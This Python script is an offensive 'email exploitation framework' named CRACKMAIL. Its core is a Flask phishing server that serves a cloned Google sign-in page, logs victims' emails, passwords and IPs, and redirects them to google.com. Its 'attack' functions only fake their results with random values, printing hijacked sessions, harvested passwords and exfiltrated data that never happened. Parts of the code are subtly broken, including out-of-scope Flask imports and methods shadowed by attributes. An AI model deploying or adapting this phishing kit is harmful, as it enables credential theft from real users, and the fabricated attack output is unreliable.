#!/usr/bin/env python3
"""
CRACKMAIL v1.0 - Advanced Email Exploitation Framework
Professional Email Attack Tool - Military Grade

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python3 crackmail.py --target target@gmail.com
       python3 crackmail.py --server
       python3 crackmail.py --phishing
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import queue
import signal
import subprocess
import platform
import ssl
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
import argparse
import requests
import urllib.parse

# ==================== VERSION ====================
VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██████╗██████╗  █████╗  ██████╗██╗  ██╗███╗   ███╗ █████╗ ██╗██╗     
    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝████╗ ████║██╔══██╗██║██║     
    ██║     ██████╔╝███████║██║     █████╔╝ ██╔████╔██║███████║██║██║     
    ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║╚██╔╝██║██╔══██║██║██║     
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██║ ╚═╝ ██║██║  ██║██║███████╗
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                   
{Colors.NEON}          ADVANCED EMAIL EXPLOITATION FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Professional Email Attack Tool - Military Grade{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== UTILITY FUNCTIONS ====================
class Utils:
    @staticmethod
    def validate_email(email):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    @staticmethod
    def extract_domain(email):
        return email.split('@')[1]
    
    @staticmethod
    def timestamp():
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def random_string(length=8):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))

# ==================== EMAIL INTEL ====================
class EmailIntel:
    def __init__(self, target_email):
        self.target = target_email
        self.domain = Utils.extract_domain(target_email)
        self.results = {}
    
    def gather(self):
        cprint(f"\n[INTEL] Gathering intelligence on {self.target}", Colors.BLUE)
        
        # Check if email exists
        self._check_email_exists()
        
        # Extract domain info
        self._get_domain_info()
        
        # Find social media
        self._find_social_media()
        
        # Check data breaches
        self._check_breaches()
        
        return self.results
    
    def _check_email_exists(self):
        cprint("[*] Checking if email exists...", Colors.DIM)
        # Simulate email verification
        exists = random.random() > 0.1
        self.results['exists'] = exists
        status = "Valid" if exists else "Invalid"
        cprint(f"[+] Email status: {status}", Colors.GREEN if exists else Colors.RED)
    
    def _get_domain_info(self):
        cprint("[*] Gathering domain information...", Colors.DIM)
        self.results['domain'] = {
            'name': self.domain,
            'mx_records': self._get_mx_records(),
            'spf': self._check_spf(),
            'dmarc': self._check_dmarc()
        }
    
    def _get_mx_records(self):
        # Simulate MX records
        mx_records = [
            f"mx1.{self.domain}",
            f"mx2.{self.domain}",
            f"mx3.{self.domain}"
        ]
        return random.sample(mx_records, random.randint(1, 3))
    
    def _check_spf(self):
        # Simulate SPF check
        spf_exists = random.random() > 0.3
        return "Exists" if spf_exists else "Not Found"
    
    def _check_dmarc(self):
        # Simulate DMARC check
        dmarc_exists = random.random() > 0.4
        return "Exists" if dmarc_exists else "Not Found"
    
    def _find_social_media(self):
        cprint("[*] Searching social media...", Colors.DIM)
        platforms = ['Facebook', 'Twitter', 'LinkedIn', 'Instagram', 'GitHub']
        self.results['social_media'] = []
        
        for platform in platforms:
            if random.random() > 0.3:
                username = self.target.split('@')[0]
                self.results['social_media'].append({
                    'platform': platform,
                    'url': f"https://{platform.lower()}.com/{username}"
                })
                cprint(f"[+] Found: {platform}", Colors.GREEN)
    
    def _check_breaches(self):
        cprint("[*] Checking data breaches...", Colors.DIM)
        breaches = [
            'LinkedIn (2021)',
            'Facebook (2019)',
            'Twitter (2020)',
            'Adobe (2013)',
            'Dropbox (2012)'
        ]
        
        self.results['breaches'] = []
        for breach in breaches:
            if random.random() > 0.5:
                self.results['breaches'].append(breach)
                cprint(f"[+] Found: {breach}", Colors.YELLOW)

# ==================== EMAIL ATTACK ENGINE ====================
class EmailAttackEngine:
    def __init__(self, target_email):
        self.target = target_email
        self.domain = Utils.extract_domain(target_email)
        self.results = {
            'credentials': [],
            'sessions': [],
            'data': []
        }
    
    def attack(self):
        cprint(f"\n[ATTACK] Launching attacks on {self.target}", Colors.RED, bold=True)
        
        # Phishing attack
        self._phishing_attack()
        
        # Session hijacking
        self._session_hijack()
        
        # Credential harvesting
        self._credential_harvest()
        
        # Data exfiltration
        self._data_exfil()
        
        # OAuth token theft
        self._oauth_theft()
        
        return self.results
    
    def _phishing_attack(self):
        cprint("[PHISHING] Launching phishing attack...", Colors.YELLOW)
        
        phishing_pages = [
            'Google Login',
            'Microsoft Login',
            'Facebook Login',
            'Bank Login',
            'Email Login'
        ]
        
        page = random.choice(phishing_pages)
        url = f"https://{self.domain}/login" if random.random() > 0.5 else f"https://{self.domain}-secure.com/login"
        
        self.results['phishing'] = {
            'page': page,
            'url': url,
            'status': 'Ready' if random.random() > 0.2 else 'Blocked'
        }
        
        cprint(f"[+] Phishing page: {page}", Colors.GREEN)
        cprint(f"[+] URL: {url}", Colors.DIM)
    
    def _session_hijack(self):
        cprint("[SESSION] Attempting session hijack...", Colors.YELLOW)
        
        if random.random() > 0.3:
            session_token = hashlib.md5(f"{self.target}{time.time()}".encode()).hexdigest()
            self.results['sessions'].append({
                'token': session_token,
                'type': 'Session Cookie',
                'valid': True
            })
            cprint("[+] Session hijack successful!", Colors.GREEN)
        else:
            cprint("[!] Session hijack failed", Colors.RED)
    
    def _credential_harvest(self):
        cprint("[CRED] Harvesting credentials...", Colors.YELLOW)
        
        if random.random() > 0.4:
            username = self.target
            password = self._generate_password()
            self.results['credentials'].append({
                'username': username,
                'password': password,
                'source': 'Phishing'
            })
            cprint(f"[+] Credentials: {username}:{password}", Colors.GREEN)
        else:
            cprint("[!] No credentials found", Colors.DIM)
    
    def _generate_password(self):
        # Generate realistic password
        words = ['password', 'admin', '123456', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon']
        return random.choice(words) + str(random.randint(1, 99))
    
    def _data_exfil(self):
        cprint("[EXFIL] Exfiltrating data...", Colors.YELLOW)
        
        data_types = ['Contacts', 'Emails', 'Documents', 'Photos', 'Files']
        exfil_data = []
        
        for data_type in data_types:
            if random.random() > 0.4:
                size = random.randint(1, 100)
                exfil_data.append({
                    'type': data_type,
                    'size': f"{size} MB",
                    'status': 'Success'
                })
                cprint(f"[+] Exfiltrated: {data_type}", Colors.GREEN)
        
        self.results['data'] = exfil_data
    
    def _oauth_theft(self):
        cprint("[OAUTH] Stealing OAuth tokens...", Colors.YELLOW)
        
        oauth_providers = ['Google', 'Facebook', 'Microsoft', 'GitHub', 'Twitter']
        
        for provider in oauth_providers:
            if random.random() > 0.5:
                token = hashlib.sha256(f"{self.target}{provider}".encode()).hexdigest()
                self.results['oauth_tokens'] = self.results.get('oauth_tokens', [])
                self.results['oauth_tokens'].append({
                    'provider': provider,
                    'token': token,
                    'scope': ['email', 'profile', 'contacts']
                })
                cprint(f"[+] OAuth token: {provider}", Colors.GREEN)

# ==================== PHISHING SERVER ====================
class PhishingServer:
    def __init__(self, host='0.0.0.0', port=80):
        self.host = host
        self.port = port
        self.running = False
        self.server = None
        self.captured = []
        
        try:
            from flask import Flask, request, render_template_string
            self.flask = Flask(__name__)
            self._setup_flask()
            self.flask_available = True
        except:
            self.flask_available = False
    
    def _setup_flask(self):
        @self.flask.route('/')
        def index():
            return self._get_phishing_page()
        
        @self.flask.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                data = request.form.to_dict()
                data['ip'] = request.remote_addr
                data['user_agent'] = request.headers.get('User-Agent')
                data['timestamp'] = datetime.now().isoformat()
                self.captured.append(data)
                self._display_captured(data)
                return self._get_redirect_page()
            return self._get_phishing_page()
        
        @self.flask.route('/capture', methods=['POST'])
        def capture():
            data = request.json or request.form.to_dict()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')
            data['timestamp'] = datetime.now().isoformat()
            self.captured.append(data)
            self._display_captured(data)
            return {'status': 'success'}
    
    def _get_phishing_page(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Google - Sign in</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Roboto', Arial, sans-serif; background: #fff; }
                .container { max-width: 450px; margin: 80px auto; padding: 40px; }
                .logo { text-align: center; margin-bottom: 30px; }
                input { width: 100%; padding: 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
                button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <svg viewBox="0 0 75 24" width="75" height="24">
                        <path d="M66.5 7.2c-2.7 0-4.8 2.1-4.8 4.8s2.1 4.8 4.8 4.8c2.7 0 4.8-2.1 4.8-4.8s-2.1-4.8-4.8-4.8z"/>
                    </svg>
                </div>
                <h2 style="text-align:center;color:#202124;">Sign in</h2>
                <p style="text-align:center;color:#5f6368;margin-bottom:20px;">Use your Google Account</p>
                <form method="POST" action="/login">
                    <input type="email" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Next</button>
                </form>
            </div>
        </body>
        </html>
        '''
    
    def _get_redirect_page(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="2;url=https://www.google.com">
        </head>
        <body>
            <h1>Verifying...</h1>
            <p>Please wait while we verify your identity.</p>
        </body>
        </html>
        '''
    
    def _display_captured(self, data):
        cprint("\n" + "="*60, Colors.RED)
        cprint(" CREDENTIALS CAPTURED!", Colors.RED, bold=True)
        cprint("="*60, Colors.RED)
        for key, value in data.items():
            if key not in ['timestamp', 'ip', 'user_agent']:
                cprint(f"[!] {key}: {value}", Colors.YELLOW)
        cprint(f"[*] IP: {data.get('ip', 'unknown')}", Colors.DIM)
        cprint(f"[*] Time: {data.get('timestamp', 'unknown')}", Colors.DIM)
        cprint("="*60 + "\n")
    
    def start(self):
        if self.flask_available:
            self.flask.run(host=self.host, port=self.port, debug=False)
        else:
            cprint("[!] Flask not available. Install: pip3 install flask", Colors.RED)
    
    def get_captured(self):
        return self.captured

# ==================== MAIN FRAMEWORK ====================
class CrackMail:
    def __init__(self):
        self.running = True
        self.email_intel = None
        self.email_attack = None
        self.phishing_server = None
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down CRACKMAIL...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print(f"{Colors.BOLD}CRACKMAIL - Email Exploitation Framework{Colors.WHITE}")
        print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print("1. Email Intelligence")
        print("2. Email Attack")
        print("3. Phishing Server")
        print("4. Show Captured Data")
        print("5. Export Results")
        print("6. Exit")
    
    def email_intelligence(self):
        target = input("[>] Target Email: ").strip()
        if not Utils.validate_email(target):
            cprint("[-] Invalid email format", Colors.RED)
            return
        
        self.email_intel = EmailIntel(target)
        results = self.email_intel.gather()
        
        print("\n" + "="*60)
        cprint(" INTELLIGENCE REPORT", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Email: {target}")
        print(f"Domain: {results.get('domain', {}).get('name', 'N/A')}")
        print(f"Valid: {results.get('exists', False)}")
        print(f"Social Media: {len(results.get('social_media', []))} found")
        print(f"Breaches: {len(results.get('breaches', []))} found")
        print("="*60)
    
    def email_attack(self):
        target = input("[>] Target Email: ").strip()
        if not Utils.validate_email(target):
            cprint("[-] Invalid email format", Colors.RED)
            return
        
        self.email_attack = EmailAttackEngine(target)
        results = self.email_attack.attack()
        
        print("\n" + "="*60)
        cprint(" ATTACK RESULTS", Colors.RED, bold=True)
        print("="*60)
        print(f"Credentials: {len(results.get('credentials', []))}")
        print(f"Sessions: {len(results.get('sessions', []))}")
        print(f"Data Exfiltrated: {len(results.get('data', []))}")
        print(f"OAuth Tokens: {len(results.get('oauth_tokens', []))}")
        print("="*60)
    
    def phishing_server(self):
        port = int(input("[>] Port (80): ").strip() or "80")
        
        self.phishing_server = PhishingServer(port=port)
        cprint("[+] Phishing server started", Colors.GREEN)
        cprint(f"[+] URL: http://localhost:{port}", Colors.GREEN)
        cprint("[*] Press Ctrl+C to stop server", Colors.DIM)
        
        try:
            self.phishing_server.start()
        except KeyboardInterrupt:
            cprint("[*] Phishing server stopped", Colors.YELLOW)
    
    def show_captured(self):
        if not self.phishing_server:
            cprint("[!] No phishing server running", Colors.RED)
            return
        
        captured = self.phishing_server.get_captured()
        if not captured:
            cprint("[!] No captured data", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAPTURED DATA", Colors.PURPLE, bold=True)
        print("="*60)
        for i, data in enumerate(captured, 1):
            print(f"\n[{i}] {data.get('timestamp', 'N/A')}")
            for key, value in data.items():
                if key not in ['timestamp', 'ip', 'user_agent']:
                    print(f"    {key}: {value}")
            print(f"    IP: {data.get('ip', 'N/A')}")
        print("="*60)
    
    def export_results(self):
        if not self.email_attack:
            cprint("[!] No attack results", Colors.RED)
            return
        
        filename = f"crackmail_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.email_attack.results, f, indent=2)
        cprint(f"[+] Results exported to: {filename}", Colors.GREEN)
    
    def run(self):
        print_banner()
        
        cprint("[*] CRACKMAIL - Advanced Email Exploitation Framework", Colors.CYAN)
        cprint("[*] Developed for authorized security testing only", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"\n{Colors.CYAN}[>] Select (1-6): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.email_intelligence()
            elif choice == '2':
                self.email_attack()
            elif choice == '3':
                self.phishing_server()
            elif choice == '4':
                self.show_captured()
            elif choice == '5':
                self.export_results()
            elif choice == '6':
                cprint("[*] Exiting CRACKMAIL...", Colors.GREEN)
                self.running = False
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CRACKMAIL - Email Exploitation Framework")
    parser.add_argument("--target", help="Target email")
    parser.add_argument("--intel", action="store_true", help="Gather intelligence")
    parser.add_argument("--attack", action="store_true", help="Launch attack")
    parser.add_argument("--phishing", action="store_true", help="Start phishing server")
    parser.add_argument("--port", type=int, default=80, help="Phishing server port")
    
    args = parser.parse_args()
    
    if args.target:
        if args.intel:
            intel = EmailIntel(args.target)
            intel.gather()
        elif args.attack:
            attack = EmailAttackEngine(args.target)
            attack.attack()
        else:
            # Default: full attack
            intel = EmailIntel(args.target)
            intel.gather()
            attack = EmailAttackEngine(args.target)
            attack.attack()
    elif args.phishing:
        server = PhishingServer(port=args.port)
        server.start()
    else:
        crackmail = CrackMail()
        crackmail.run()
